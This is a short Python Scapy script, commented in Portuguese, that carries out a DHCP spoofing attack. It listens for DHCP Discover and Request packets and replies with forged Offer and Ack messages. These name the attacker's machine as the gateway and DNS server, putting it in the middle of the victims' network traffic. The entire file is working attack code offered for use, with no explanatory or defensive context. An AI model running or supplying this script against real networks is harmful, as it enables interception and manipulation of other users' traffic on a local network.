from scapy.all import *
import random

# Defina o IP e MAC da máquina atacante
attacker_ip = "10.32.143.22"
attacker_mac = get_if_hwaddr(conf.iface)

def dhcp_offer(pkt):
    if DHCP in pkt and pkt[DHCP].options[0][1] == 1:
        print("DHCP Discover recebido")
        
        # Construindo a mensagem DHCP Offer
        offer = Ether(src=attacker_mac, dst=pkt[Ether].src) / \
                IP(src=attacker_ip, dst="255.255.255.255") / \
                UDP(sport=67, dport=68) / \
                BOOTP(op=2, yiaddr="10.32.143.100", siaddr=attacker_ip, chaddr=pkt[BOOTP].chaddr) / \
                DHCP(options=[("message-type", "offer"), ("server_id", attacker_ip), ("lease_time", 600), ("subnet_mask", "255.255.255.0"), ("router", attacker_ip), ("name_server", attacker_ip), "end"])
        
        sendp(offer, iface=conf.iface)
        print("DHCP Offer enviado")

def dhcp_ack(pkt):
    if DHCP in pkt and pkt[DHCP].options[0][1] == 3:
        print("DHCP Request recebido")
        
        # Construindo a mensagem DHCP Acknowledgement
        ack = Ether(src=attacker_mac, dst=pkt[Ether].src) / \
              IP(src=attacker_ip, dst="255.255.255.255") / \
              UDP(sport=67, dport=68) / \
              BOOTP(op=2, yiaddr="10.32.143.100", siaddr=attacker_ip, chaddr=pkt[BOOTP].chaddr) / \
              DHCP(options=[("message-type", "ack"), ("server_id", attacker_ip), ("lease_time", 600), ("subnet_mask", "255.255.255.0"), ("router", attacker_ip), ("name_server", attacker_ip), "end"])
        
        sendp(ack, iface=conf.iface)
        print("DHCP Ack enviado")

def main():
    print("Iniciando DHCP Spoofing...")
    sniff(filter="udp and (port 67 or 68)", prn=lambda x: dhcp_offer(x) if DHCP in x and x[DHCP].options[0][1] == 1 else dhcp_ack(x))

if __name__ == "__main__":
    main()